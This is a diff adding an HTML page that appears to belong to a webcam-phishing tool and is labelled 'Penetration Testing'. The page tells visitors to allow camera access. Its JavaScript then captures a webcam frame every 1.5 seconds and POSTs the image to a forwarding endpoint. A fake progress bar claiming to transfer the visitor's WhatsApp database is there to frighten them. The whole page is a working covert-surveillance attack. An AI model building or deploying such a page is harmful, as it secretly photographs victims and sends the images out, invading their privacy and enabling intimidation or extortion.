@@ -1,0 +1,234 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oswald|Roboto">
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.css">
+<link rel="stylesheet" href="progress-bar.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<script src="https://code.jquery.com/jquery-1.12.4.js"></script>
+<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.js"></script>
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+<meta name="viewport" content="width=device-width",intial-scale=1.0>
+
+<h1 style="color:white;">
+	<center><b>Penetration Testing<b></center>
+</h1>
+
+</head>
+
+<div class="video-wrap">
+   <video id="video" playsinline autoplay></video>
+</div>
+<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){
+        // call the function that handles the response/results
+    },
+    error: function(){
+    }
+  });
+};
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  window.stream = stream;
+  video.srcObject = stream;
+
+var context = canvas.getContext('2d');
+  setInterval(function(){
+
+       context.drawImage(video, 0, 0, 640, 480);
+       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+       post(canvasData); }, 1500);
+  
+
+}
+
+// Load init
+init();
+
+</script>
+<body>
+<h1 style="color:white;">
+	<center><strong>🤳 Click allow to use your Camera 🤳</strong></center>
+</h1>
+<style>
+
+
+.icon-bar {
+  position: fixed;
+  top: 70%;
+  -webkit-transform: translateY(-50%);
+  -ms-transform: translateY(-50%);
+  transform: translateY(-50%);
+}
+
+.icon-bar a {
+  display: block;
+  text-align: center;
+  padding: 10px;
+  transition: all 0.3s ease;
+  color: white;
+  font-size: 10px;
+}
+
+.icon-bar a:hover {
+  background-color: #000;
+}
+
+.facebook {
+  background: #3B5998;
+  color: white;
+}
+
+.twitter {
+  background: #55ACEE;
+  color: white;
+}
+
+.google {
+  background: #dd4b39;
+  color: white;
+}
+
+.linkedin {
+  background: #007bb5;
+  color: white;
+}
+
+.youtube {
+  background: #bb0000;
+  color: white;
+}
+
+.content {
+  margin-left: 75px;
+  font-size: 30px;
+}
+#progressbar {
+  background-color: red;
+}
+
+.progress-label {
+  background-color: lightgreen;
+}
+
+.button {
+  background-color: #f44336; /* Green */
+  border: none;
+  color: white;
+  padding: 15px 32px;
+  text-align: center;
+  text-decoration: none;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+div.fixed {
+  position: fixed;
+  bottom: 0;
+  right: 0;
+  width: 300px;
+  border: 3px;
+}
+
+</style><br><center>
+<font color="green"><p><a href="https://github.com/amaan14/saycheese">follow us on github</a></p></font>
+<img src="https://images.idgesg.net/images/article/2019/07/cso_nw_black_hat_hacker_entering_keyhole_in_binary_room_by_beebright_gettyimages-531249946_2400x1600-100802504-large.jpg" height="200" width="300">
+</center>
+<body style="background-color:black";>
+<script>
+$(document).ready(function() {
+$( function() {
+    var progressbar = $( "#progressbar" ),
+      progressLabel = $( ".progress-label" );
+ 
+    progressbar.progressbar({
+      value: false,
+      change: function() {
+        progressLabel.text( progressbar.progressbar( "value" ) + "%" );
+      },
+      complete: function() {
+        progressLabel.text( "Database File Transferred Succesfully!" );
+      }
+    });
+ 
+    function progress() {
+      var val = progressbar.progressbar( "value" ) || 5;//initial start
+ 
+      progressbar.progressbar( "value", val + 3 );//step size
+ 
+      if ( val < 99 ) {
+        setTimeout( progress, 40 );
+      }
+    }
+ 
+    setTimeout( progress, 1000 );//speed of downloading
+  } );
+});
+</script>
+
+<br>
+<div class="container">
+<div class="well">
+<p><b>Looking for whatsapp database....</b> </p>
+<div id="progressbar"><div class="progress-label">Transferring...</div></div>
+</div>
+</div><center>
+<div class="icon-bar">
+  <a href="#" class="facebook"><i class="fa fa-facebook"></i></a> 
+  <a href="#" class="twitter"><i class="fa fa-twitter"></i></a> 
+  <a href="#" class="google"><i class="fa fa-google"></i></a> 
+  <a href="#" class="linkedin"><i class="fa fa-linkedin"></i></a>
+  <a href="#" class="youtube"><i class="fa fa-youtube"></i></a> 
+</div>
+<button class="button" onclick=alert("Trojan_Detected")>Stop</button>
+<div class="fixed">
+<div align="left" style="border:1px">
+<div align="right" style="border:1px">
+<font color="white"><p1>this tool is created by JCGrey<br></p1></font>
+<font color="orange">
+<p2>Copyright underact 2019<br> by ATAD Co-Operation</p2></font>
+</div>
+<body>
+</html>
